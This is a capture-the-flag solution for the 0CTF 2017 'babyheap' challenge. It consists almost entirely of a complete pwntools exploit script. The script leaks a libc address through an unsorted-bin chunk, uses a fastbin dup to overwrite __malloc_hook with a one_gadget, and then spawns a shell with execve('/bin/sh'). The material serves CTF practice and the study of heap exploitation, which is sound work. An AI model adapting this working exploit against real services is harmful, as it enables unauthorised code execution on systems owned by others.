# **babyheap**

#### tag : pwnable, fastbin-dup-attack, unsortedbin-attack, how2heap, archive

-----------------------------------------------

#### Description

>Let's practice some basic heap (babyheap_69a42acd160ab67a68047ca3f9c390b9) techniques in 2017 together!
>
>202.120.7.218:2017
>
>libc.so.6_b86ec517ee44b2d6c03096e0518c72a1

-----------------------------------------------

#### Solution

```python

from pwn import *

### DEBUGGING ###
DEBUG = True

if DEBUG:
    r = process('./babyheap', env = {'LD_PRELOAD': './libc.so.6'})
    # I have error with this libc in my computer, so replace it.
    # It'll affect address of main_arena_offset and one_gadget_offset.
    # replaced libc : libc.so.6
    # original libc : libc.so.6_b86ec517ee44b2d6c03096e0518c72a1

    timeout = 0.1

else :
    r = remote('0.0.0.0', 1337)
    timeout = 0.3

def rr(s):
    sleep(timeout)
    return r.recvuntil(s)

def ss(s):
    sleep(timeout)
    #return r.send(s)
    return r.sendline(s)

def Allocate(s):
    rr('Command: ')
    ss('1')

    rr('Size: ')
    ss(str(s))

def Fill(i,s,c):
    rr('Command: ')
    ss('2')

    rr('Index: ')
    ss(str(i))

    rr('Size: ')
    ss(str(s))

    rr('Content: ')
    ss(c)

def Free(i):
    rr('Command: ')
    ss('3')

    rr('Index: ')
    ss(str(i))

def Dump(i):
    rr('Command: ')
    ss('4')

    rr('Index: ')
    ss(str(i))

    rr('Content: ')
    return rr('1. ')[1:-3]

### ADDRESS ###

main_arena_offset = 0x3c4b20

'''
0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
'''
one_gadget_offset = 0x4526a

### EXPLOIT ###
def main():
    # table[0] -> chunk0 (0x21)
    Allocate(0x18)
    # table[1] -> chunk1 (0x21)
    Allocate(0x18)
    # table[2] -> chunk2 (0x21)
    Allocate(0x18)
    # table[3] -> chunk3 (0x31)
    Allocate(0x28)
    ### table[4] -> chunk4 (0x21)
    ### Allocate(0x18)

    # 0x20 : chunk1
    Free(1)

    # table[1] -> chunk4 (0x1001)
    Allocate(0x1000)

    # table[4] -> chunk1 (0x21)
    Allocate(0x18)

    # modify chunk1's header (resize to 0x81)
    fake_chunk_header = '\x00' * 16 + p64(0) + p64(0x71)
    Fill(0, len(fake_chunk_header), fake_chunk_header)

    # 0x80 : chunk1 (0x81)
    Free(4)

    # table[5] -> chunk1 (0x81)
    Allocate(0x68)

    # chunk2, chunk3 recovery for free
    chunk_recovery = ('\x00' * 24 + p64(0x21)) + ('\x00' * 24 + p64(0x31))
    Fill(4, len(chunk_recovery), chunk_recovery)

    # 0x20 : chunk2
    Free(2)

    # smallbin : chunk2
    # table[2] -> chunk5 (0x1001)
    Allocate(0x1000)

    # leak main_arena, libc_base, libc_system address
    main_arena = u64(Dump(4)[0x20:0x28]) - 104
    libc_base = main_arena - main_arena_offset
    one_gadget = libc_base + one_gadget_offset
    log.info('main_arena address : 0x%x' % main_arena)
    log.info('libc_base address : 0x%x' % libc_base)
    log.info('one_gadget address : 0x%x' % one_gadget)

    # 0x80 : chunk1 (0x81)
    Free(4)

    # modify chunk1's fd (to &main_arena-0x23 for malloc_hook)
    fake_chunk_header = '\x00' * 16 + p64(0) + p64(0x71) + p64(main_arena-0x23)
    Fill(0, len(fake_chunk_header), fake_chunk_header)

    # fasbin_attck
    Allocate(0x68)
    Allocate(0x68)

    # overwrite malloc_hook to one_gadget(execve with /bin/sh)
    payload = '\x00' * 3 + p64(one_gadget)
    Fill(5, len(payload), payload)

    # execute execve()
    Allocate(0x18)

    r.interactive()

if __name__ == '__main__':
    try:
        main()
    except:
        log.info('exception occur')

```
